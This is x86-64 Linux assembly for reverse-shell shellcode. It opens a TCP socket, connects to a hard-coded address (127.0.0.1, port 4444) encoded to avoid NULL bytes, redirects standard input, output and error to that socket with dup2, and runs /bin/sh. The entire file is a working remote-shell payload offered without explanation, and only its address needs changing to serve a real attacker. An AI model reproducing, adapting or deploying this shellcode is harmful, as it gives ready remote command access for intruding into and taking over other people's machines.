
section .text

global _start
_start:
	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	xor rdx, rdx
	xor r8, r8
; ---------------------------------------------------------------------

create_socket:
	mov dil, 2  ; ipv4 - first argument
	mov sil, 1  ; tcp - second argument
	mov al, 41 ; socket syscall
	syscall

	mov r8b, al ; save socket fd

	
; ---------------------------------------------------------------------


connect_socket:
	mov eax, 0x02010180 ; 128.1.1.2
	sub eax, 0x01010101 ; 1.1.1.1  -> remove NULL bytes
	push rax
	sub rsp, 4
	mov word[rsp], 2 ; set ipv4 for struct
	mov word[rsp+2], 0x5c11 ; set network port

	mov dil, r8b ; set fd to first arg
	mov rsi, rsp ; set network struct to second arg
	mov dl, 16 ; size of the struct
	mov r9b, 42
	movzx rax, r9b ; connect syscall
	syscall
	add rsp, 4
	
	test rax, rax
	jz loop_dup
	mov esi, fail_conn_msg
	mov dl, fail_conn_msg_len
	jmp display_msg
; ---------------------------------------------------------------------


loop_dup:
	mov rdx, rax
	xor rdx, 2
	

; ---------------------------------------------------------------------

dup_fd:
	mov al, 33 ; dup2 syscall
	mov rsi, rdx ; fd of stdin, stdout, stderr per loop
	mov rdi, r8  ; our socket fd
	syscall

	dec dl
	test dl, dl
	jge dup_fd


; ---------------------------------------------------------------------

shell:
	mov rax, 0x0068732f6e69622f ; /bin/sh
	push rax
	mov rdi, rsp ; first arg for execve
	xor rsi, rsi ;second arg for execve
	xor rdx, rdx  ; third arg for execve
	add al, 0xc ; away to avoid null bytes
	movzx rax, al  ; execve syscall
	syscall
	

; ---------------------------------------------------------------------
display_msg:
	xor rax, rax
	xor rdi, rdi
	add dl, 1 ; stdout
	add al, 1 ; write syscall
	syscall

	jmp exit

; ---------------------------------------------------------------------

exit:
	mov al, 60 ; exit syscall
	add dl, 1  ; exit first arg
	syscall

; ---------------------------------------------------------------------


section .data
	fail_conn_msg db "[-] Could not connect to server, is the server listening ?", 0xa, 0xd
	fail_conn_msg_len equ $- fail_conn_msg

	









